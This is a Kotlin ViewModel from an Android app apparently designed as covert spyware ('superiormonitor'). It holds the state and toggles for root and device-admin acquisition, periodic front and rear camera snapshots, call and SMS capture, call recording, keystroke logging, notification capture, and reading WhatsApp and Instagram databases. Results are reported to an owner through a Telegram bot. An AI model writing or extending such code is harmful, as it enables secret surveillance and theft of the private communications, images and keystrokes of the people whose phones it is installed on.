package com.system.superiormonitor.ui

import android.app.Application
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.core.LogManager
import com.system.superiormonitor.core.SystemManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

data class PermissionStatus(
    val hasRoot: Boolean = false,
    val hasDeviceAdmin: Boolean = false,
    val hasNotifListener: Boolean = false,
    val hasPostNotifs: Boolean = false,
    val hasAccessibility: Boolean = false,
    val hasSystemAlertWindow: Boolean = false,
    val hasIgnoreBattery: Boolean = false,
    val hasCallAccess: Boolean = false,
    val hasSmsAccess: Boolean = false,
    val hasContactsAccess: Boolean = false,
    val hasCameraAccess: Boolean = false,
    val hasMicrophoneAccess: Boolean = false,
    val isInternetConnected: Boolean = false,
    val hasWriteSettings: Boolean = false
) {
    val allPermissionsGranted: Boolean
        get() = hasRoot && hasDeviceAdmin && hasNotifListener && hasAccessibility && hasSystemAlertWindow && hasIgnoreBattery && hasCallAccess && hasSmsAccess && hasContactsAccess && hasMicrophoneAccess && hasWriteSettings && (hasCameraAccess || hasRoot)
}

data class DashboardUiState(
    val forceMobileData: Boolean = false,
    val forceWifi: Boolean = false,
    val forceHotspot: Boolean = false,
    val persistentEnforcementEnabled: Boolean = false,
    val showPersistentEnforcementDialog: Boolean = false,
    val enableSnapshots: Boolean = false,
    val snapshotIntervalMin: Int = 15,
    val enableFrontCamera: Boolean = false,
    val frontCameraIntervalMin: Int = 15,
    val enableRearCamera: Boolean = false,
    val rearCameraIntervalMin: Int = 15,
    val whatsappUpdatesEnabled: Boolean = false,
    val instagramUpdatesEnabled: Boolean = false,
    val callAlertsEnabled: Boolean = false,
    val smsAlertsEnabled: Boolean = false,
    val forwardRecordingEnabled: Boolean = false,
    val whatsappBusinessUpdatesEnabled: Boolean = false,
    val keyEventsEnabled: Boolean = false,
    val keyEventsIntervalMin: Int = 15,
    val notificationEventsEnabled: Boolean = false,
    val notificationBlockSocialEnabled: Boolean = false,
    val currentWarningTitle: String? = null,
    val currentWarningMessage: String? = null
)

sealed class DashboardEvent {
    data class ToggleService(val enabled: Boolean) : DashboardEvent()
    data class ToggleForceMobileData(val enabled: Boolean) : DashboardEvent()
    data class ToggleForceWifi(val enabled: Boolean) : DashboardEvent()
    data class ToggleForceHotspot(val enabled: Boolean) : DashboardEvent()
    data class TogglePersistentEnforcement(val enabled: Boolean) : DashboardEvent()
    data class ShowPersistentEnforcementDialog(val show: Boolean) : DashboardEvent()
    data class ToggleSnapshots(val enabled: Boolean) : DashboardEvent()
    data class UpdateSnapshotInterval(val minutes: Int) : DashboardEvent()
    data class ToggleFrontCamera(val enabled: Boolean) : DashboardEvent()
    data class UpdateFrontCameraInterval(val minutes: Int) : DashboardEvent()
    data class ToggleRearCamera(val enabled: Boolean) : DashboardEvent()
    data class UpdateRearCameraInterval(val minutes: Int) : DashboardEvent()
    data class ToggleWhatsappUpdates(val enabled: Boolean) : DashboardEvent()
    data class ToggleInstagramUpdates(val enabled: Boolean) : DashboardEvent()
    data class ToggleCallAlerts(val enabled: Boolean) : DashboardEvent()
    data class ToggleSmsAlerts(val enabled: Boolean) : DashboardEvent()
    data class ToggleForwardRecording(val enabled: Boolean) : DashboardEvent()
    data class ToggleWhatsappBusinessUpdates(val enabled: Boolean) : DashboardEvent()
    data class ToggleKeyEvents(val enabled: Boolean) : DashboardEvent()
    data class UpdateKeyEventsInterval(val minutes: Int) : DashboardEvent()
    data class ToggleNotificationEvents(val enabled: Boolean) : DashboardEvent()
    data class ToggleNotificationBlockSocial(val enabled: Boolean) : DashboardEvent()
    object DismissWarningDialog : DashboardEvent()
}

/**
 * ViewModel for the main app screen. Owns all prefs-backed state and
 * exposes reactive LogManager flows for the UI to observe.
 */
class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val prefs = PrefsManager.getInstance(application)

    private val _isNetworkAvailable = MutableStateFlow(false)
    val isNetworkAvailable: StateFlow<Boolean> = _isNetworkAvailable.asStateFlow()

    private val _isDashboardScreenActive = MutableStateFlow(false)
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var prefListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null

    init {
        val cm = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        _isNetworkAvailable.value = cm.activeNetwork != null

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                _isNetworkAvailable.value = true
                if (_isDashboardScreenActive.value) {
                    checkTelegramConnection()
                }
            }
            override fun onLost(network: Network) {
                _isNetworkAvailable.value = false
                LogManager.setTelegramApiReachable(false)
            }
        }
        cm.registerDefaultNetworkCallback(networkCallback!!)
        
        prefListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, _ ->
            _dashboardState.update { 
                it.copy(
                    forceMobileData = prefs.forceMobileData,
                    forceWifi = prefs.forceWifi,
                    forceHotspot = prefs.forceHotspot,
                    persistentEnforcementEnabled = prefs.persistentEnforcementEnabled,
                    enableSnapshots = prefs.enableSnapshots,
                    snapshotIntervalMin = prefs.snapshotIntervalMin,
                    enableFrontCamera = prefs.enableFrontCamera,
                    frontCameraIntervalMin = prefs.frontCameraInterval,
                    enableRearCamera = prefs.enableRearCamera,
                    rearCameraIntervalMin = prefs.rearCameraInterval,
                    whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
                    instagramUpdatesEnabled = prefs.instagramEnabled,
                    whatsappBusinessUpdatesEnabled = prefs.whatsappBusinessUpdatesEnabled,
                    callAlertsEnabled = prefs.callAlertsEnabled,
                    smsAlertsEnabled = prefs.smsAlertsEnabled,
                    forwardRecordingEnabled = prefs.forwardRecordingEnabled,
                    keyEventsEnabled = prefs.keyEventsEnabled,
                    keyEventsIntervalMin = prefs.keyEventsIntervalMin,
                    notificationEventsEnabled = prefs.notificationEventsEnabled,
                    notificationBlockSocialEnabled = prefs.notificationBlockSocialEnabled
                )
            }
        }
        prefs.sharedPreferences.registerOnSharedPreferenceChangeListener(prefListener)
    }

    override fun onCleared() {
        super.onCleared()
        networkCallback?.let {
            val cm = getApplication<Application>().getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            cm.unregisterNetworkCallback(it)
        }
        prefListener?.let {
            prefs.sharedPreferences.unregisterOnSharedPreferenceChangeListener(it)
        }
    }

    fun setDashboardScreenActive(active: Boolean) {
        _isDashboardScreenActive.value = active
    }

    fun checkTelegramConnection() {
        if (LogManager.isServiceRunning.value) return // Service already handles reachability checks
        if (!_isNetworkAvailable.value) {
            LogManager.setTelegramApiReachable(false)
            return
        }
        val token = prefs.botToken
        if (token.isBlank()) {
            LogManager.setTelegramApiReachable(false)
            return
        }
        viewModelScope.launch(Dispatchers.IO) {
            val reachable = TelegramApi.isApiReachable(getApplication<Application>(), token)
            LogManager.setTelegramApiReachable(reachable)
        }
    }

    // ── Credential State ──
    var botToken by mutableStateOf(prefs.botToken)
    var chatId by mutableStateOf(prefs.chatId)
    var ownerUserId by mutableStateOf(prefs.ownerUserId)

    val hasCredentials: Boolean
        get() = botToken.trim().matches(Regex("^[0-9]+:[a-zA-Z0-9_-]+$")) && 
                chatId.trim().matches(Regex("^-?[0-9]+$")) && 
                ownerUserId.trim().matches(Regex("^[0-9]+$"))

    // ── Dashboard State ──
    private val _dashboardState = MutableStateFlow(
        DashboardUiState(
            forceMobileData = prefs.forceMobileData,
            forceWifi = prefs.forceWifi,
            forceHotspot = prefs.forceHotspot,
            persistentEnforcementEnabled = prefs.persistentEnforcementEnabled,
            enableSnapshots = prefs.enableSnapshots,
            snapshotIntervalMin = prefs.snapshotIntervalMin,
            enableFrontCamera = prefs.enableFrontCamera,
            frontCameraIntervalMin = prefs.frontCameraInterval,
            enableRearCamera = prefs.enableRearCamera,
            rearCameraIntervalMin = prefs.rearCameraInterval,
            whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
            instagramUpdatesEnabled = prefs.instagramEnabled,
            whatsappBusinessUpdatesEnabled = prefs.whatsappBusinessUpdatesEnabled,
            callAlertsEnabled = prefs.callAlertsEnabled,
            smsAlertsEnabled = prefs.smsAlertsEnabled,
            forwardRecordingEnabled = prefs.forwardRecordingEnabled,
            keyEventsEnabled = prefs.keyEventsEnabled,
            keyEventsIntervalMin = prefs.keyEventsIntervalMin,
            notificationEventsEnabled = prefs.notificationEventsEnabled,
            notificationBlockSocialEnabled = prefs.notificationBlockSocialEnabled
        )
    )
    val dashboardState: StateFlow<DashboardUiState> = _dashboardState.asStateFlow()

    // ── Permissions State ──
    private val _permissionStatus = MutableStateFlow(PermissionStatus())
    val permissionStatus: StateFlow<PermissionStatus> = _permissionStatus.asStateFlow()

    // ── Service/System Status (observed from LogManager) ──
    val isServiceRunning = LogManager.isServiceRunning
    val isTelegramApiReachable = LogManager.isTelegramApiReachable

    fun clearLogs(category: com.system.superiormonitor.core.LogCategory) {
        LogManager.clearLogs(category)
    }

    // ═══════════════════════════════════════════════════════════
    //  PERMISSIONS
    // ═══════════════════════════════════════════════════════════

    fun refreshPermissions() {
        viewModelScope.launch(Dispatchers.IO) {
            val context = getApplication<Application>()
            val prefs = PrefsManager.getInstance(context)
            
            val hasRoot = _permissionStatus.value.hasRoot || prefs.isRootEnabled
            
            _permissionStatus.value = SystemManager.checkAllPermissions(context, hasRoot)
        }
    }

    suspend fun requestRootAccess(): Boolean = kotlinx.coroutines.withContext(Dispatchers.IO) {
        val prefs = PrefsManager.getInstance(getApplication())
        try {
            val cached = com.topjohnwu.superuser.Shell.getCachedShell()
            if (cached != null && !cached.isRoot) {
                cached.close()
            }
            if (com.topjohnwu.superuser.Shell.getShell().isRoot) {
                _permissionStatus.value = _permissionStatus.value.copy(hasRoot = true)
                prefs.isRootEnabled = true
                return@withContext true
            }
        } catch (e: Exception) {
            // Ignore
        }
        return@withContext try {
            val result = com.topjohnwu.superuser.Shell.cmd("su -c id").exec()
            val isRooted = result.isSuccess
            _permissionStatus.value = _permissionStatus.value.copy(hasRoot = isRooted)
            prefs.isRootEnabled = isRooted
            isRooted
        } catch (e: Exception) {
            _permissionStatus.value = _permissionStatus.value.copy(hasRoot = false)
            prefs.isRootEnabled = false
            false
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  ACTIONS
    // ═══════════════════════════════════════════════════════════

    fun saveCredentials() {
        val token = botToken.trim()
        val chat = chatId.trim()
        val owner = ownerUserId.trim()
        
        prefs.botToken = token
        prefs.chatId = chat
        prefs.ownerUserId = owner
        
        botToken = token
        chatId = chat
        ownerUserId = owner
    }

    fun onDashboardEvent(event: DashboardEvent) {
        when (event) {
            is DashboardEvent.ToggleService -> setServiceEnabled(event.enabled)
            is DashboardEvent.ToggleForceMobileData -> {
                prefs.forceMobileData = event.enabled
                _dashboardState.update { it.copy(forceMobileData = event.enabled) }
            }
            is DashboardEvent.ToggleForceWifi -> {
                prefs.forceWifi = event.enabled
                _dashboardState.update { it.copy(forceWifi = event.enabled) }
            }
            is DashboardEvent.ToggleForceHotspot -> {
                prefs.forceHotspot = event.enabled
                _dashboardState.update { it.copy(forceHotspot = event.enabled) }
            }
            is DashboardEvent.TogglePersistentEnforcement -> {
                prefs.persistentEnforcementEnabled = event.enabled
                if (!event.enabled) {
                    prefs.forceMobileData = false
                    prefs.forceWifi = false
                    prefs.forceHotspot = false
                }
                _dashboardState.update { 
                    it.copy(
                        persistentEnforcementEnabled = event.enabled,
                        forceMobileData = if (!event.enabled) false else it.forceMobileData,
                        forceWifi = if (!event.enabled) false else it.forceWifi,
                        forceHotspot = if (!event.enabled) false else it.forceHotspot
                    ) 
                }
            }
            is DashboardEvent.ShowPersistentEnforcementDialog -> {
                _dashboardState.update { it.copy(showPersistentEnforcementDialog = event.show) }
            }
            is DashboardEvent.ToggleSnapshots -> {
                prefs.enableSnapshots = event.enabled
                _dashboardState.update { it.copy(enableSnapshots = event.enabled) }
            }
            is DashboardEvent.UpdateSnapshotInterval -> {
                prefs.snapshotIntervalMin = event.minutes
                _dashboardState.update { it.copy(snapshotIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleFrontCamera -> {
                prefs.enableFrontCamera = event.enabled
                _dashboardState.update { it.copy(enableFrontCamera = event.enabled) }
            }
            is DashboardEvent.UpdateFrontCameraInterval -> {
                prefs.frontCameraInterval = event.minutes
                _dashboardState.update { it.copy(frontCameraIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleRearCamera -> {
                prefs.enableRearCamera = event.enabled
                _dashboardState.update { it.copy(enableRearCamera = event.enabled) }
            }
            is DashboardEvent.UpdateRearCameraInterval -> {
                prefs.rearCameraInterval = event.minutes
                _dashboardState.update { it.copy(rearCameraIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleWhatsappUpdates -> {
                if (event.enabled) {
                    // Validate WhatsApp availability before enabling
                    viewModelScope.launch(Dispatchers.IO) {
                        val context = getApplication<Application>()
                        if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)) {
                            _dashboardState.update { it.copy(
                                currentWarningTitle = "WhatsApp Unavailable",
                                currentWarningMessage = "WhatsApp is not installed on this device. Please install WhatsApp before enabling this feature."
                            ) }
                            return@launch
                        }
                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)
                        if (!dbAvailable) {
                            _dashboardState.update { it.copy(
                                currentWarningTitle = "WhatsApp Unavailable",
                                currentWarningMessage = dbReason
                            ) }
                            return@launch
                        }
                        // All checks passed — enable pref FIRST, then notify BotService
                        prefs.whatsappUpdatesEnabled = true
                        _dashboardState.update { it.copy(whatsappUpdatesEnabled = true) }
                        // Now safe to notify BotService (pref is already set)
                        notifyBotService(context, "ACTION_UPDATE_WHATSAPP")
                    }
                } else {
                    prefs.whatsappUpdatesEnabled = false
                    _dashboardState.update { it.copy(whatsappUpdatesEnabled = false) }
                    notifyBotService(getApplication(), "ACTION_UPDATE_WHATSAPP")
                }
            }
            is DashboardEvent.DismissWarningDialog -> {
                _dashboardState.update { it.copy(currentWarningTitle = null, currentWarningMessage = null) }
            }
            is DashboardEvent.ToggleWhatsappBusinessUpdates -> {
                if (event.enabled) {
                    viewModelScope.launch(Dispatchers.IO) {
                        val context = getApplication<Application>()
                        if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)) {
                            _dashboardState.update { it.copy(
                                currentWarningTitle = "WA Business Unavailable",
                                currentWarningMessage = "WhatsApp Business is not installed on this device. Please install WhatsApp Business before enabling this feature."
                            ) }
                            return@launch
                        }
                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)
                        if (!dbAvailable) {
                            _dashboardState.update { it.copy(
                                currentWarningTitle = "WA Business Unavailable",
                                currentWarningMessage = dbReason
                            ) }
                            return@launch
                        }
                        prefs.whatsappBusinessUpdatesEnabled = true
                        _dashboardState.update { it.copy(whatsappBusinessUpdatesEnabled = true) }
                        notifyBotService(context, "ACTION_UPDATE_WABUSINESS")
                    }
                } else {
                    prefs.whatsappBusinessUpdatesEnabled = false
                    _dashboardState.update { it.copy(whatsappBusinessUpdatesEnabled = false) }
                    notifyBotService(getApplication(), "ACTION_UPDATE_WABUSINESS")
                }
            }

            is DashboardEvent.ToggleInstagramUpdates -> {
                if (event.enabled) {
                    viewModelScope.launch(Dispatchers.IO) {
                        val context = getApplication<Application>()
                        if (!com.system.superiormonitor.monitor.InstagramMonitor.isInstagramInstalled(context)) {
                            _dashboardState.update { it.copy(
                                currentWarningTitle = "Instagram Unavailable",
                                currentWarningMessage = "Instagram is not installed on this device. Please install Instagram before enabling this feature."
                            ) }
                            return@launch
                        }
                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.InstagramMonitor.checkInstagramDatabase()
                        if (!dbAvailable) {
                            _dashboardState.update { it.copy(
                                currentWarningTitle = "Instagram Unavailable",
                                currentWarningMessage = dbReason
                            ) }
                            return@launch
                        }
                        prefs.instagramEnabled = true
                        _dashboardState.update { it.copy(instagramUpdatesEnabled = true) }
                        notifyBotService(context, "ACTION_UPDATE_INSTAGRAM")
                    }
                } else {
                    prefs.instagramEnabled = false
                    _dashboardState.update { it.copy(instagramUpdatesEnabled = false) }
                    notifyBotService(getApplication(), "ACTION_UPDATE_INSTAGRAM")
                }
            }

            is DashboardEvent.ToggleCallAlerts -> {
                prefs.callAlertsEnabled = event.enabled
                _dashboardState.update { it.copy(callAlertsEnabled = event.enabled) }
            }
            is DashboardEvent.ToggleSmsAlerts -> {
                prefs.smsAlertsEnabled = event.enabled
                _dashboardState.update { it.copy(smsAlertsEnabled = event.enabled) }
            }
            is DashboardEvent.ToggleForwardRecording -> {
                prefs.forwardRecordingEnabled = event.enabled
                _dashboardState.update { it.copy(forwardRecordingEnabled = event.enabled) }
            }
            is DashboardEvent.ToggleKeyEvents -> {
                prefs.keyEventsEnabled = event.enabled
                _dashboardState.update { it.copy(keyEventsEnabled = event.enabled) }
            }
            is DashboardEvent.UpdateKeyEventsInterval -> {
                prefs.keyEventsIntervalMin = event.minutes
                _dashboardState.update { it.copy(keyEventsIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleNotificationEvents -> {
                prefs.notificationEventsEnabled = event.enabled
                _dashboardState.update { it.copy(notificationEventsEnabled = event.enabled) }
                notifyBotService(getApplication(), "ACTION_UPDATE_NOTIFICATIONS")
            }
            is DashboardEvent.ToggleNotificationBlockSocial -> {
                prefs.notificationBlockSocialEnabled = event.enabled
                _dashboardState.update { it.copy(notificationBlockSocialEnabled = event.enabled) }
            }
        }
    }

    fun disableAllFeatures() {
        prefs.isServiceEnabled = false
        prefs.forceMobileData = false
        prefs.forceWifi = false
        prefs.forceHotspot = false
        prefs.persistentEnforcementEnabled = false
        prefs.enableSnapshots = false
        prefs.enableFrontCamera = false
        prefs.enableRearCamera = false
        prefs.callAlertsEnabled = false
        prefs.smsAlertsEnabled = false
        prefs.forwardRecordingEnabled = false
        prefs.whatsappUpdatesEnabled = false
        prefs.instagramEnabled = false
        prefs.whatsappBusinessUpdatesEnabled = false
        prefs.keyEventsEnabled = false
        prefs.notificationEventsEnabled = false
        prefs.notificationBlockSocialEnabled = false
        
        _dashboardState.update { 
            it.copy(
                forceMobileData = false,
                forceWifi = false,
                forceHotspot = false,
                persistentEnforcementEnabled = false,
                showPersistentEnforcementDialog = false,
                enableSnapshots = false,
                callAlertsEnabled = false,
                smsAlertsEnabled = false,
                forwardRecordingEnabled = false,
                whatsappUpdatesEnabled = false,
                instagramUpdatesEnabled = false,
                whatsappBusinessUpdatesEnabled = false,
                keyEventsEnabled = false,
                notificationEventsEnabled = false,
                notificationBlockSocialEnabled = false
            )
        }
    }

    private fun notifyBotService(context: Context, action: String) {
        if (LogManager.isServiceRunning.value) {
            val intent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
                this.action = action
            }
            context.startForegroundService(intent)
        }
    }

    private fun setServiceEnabled(enabled: Boolean) {
        prefs.isServiceEnabled = enabled
    }
}
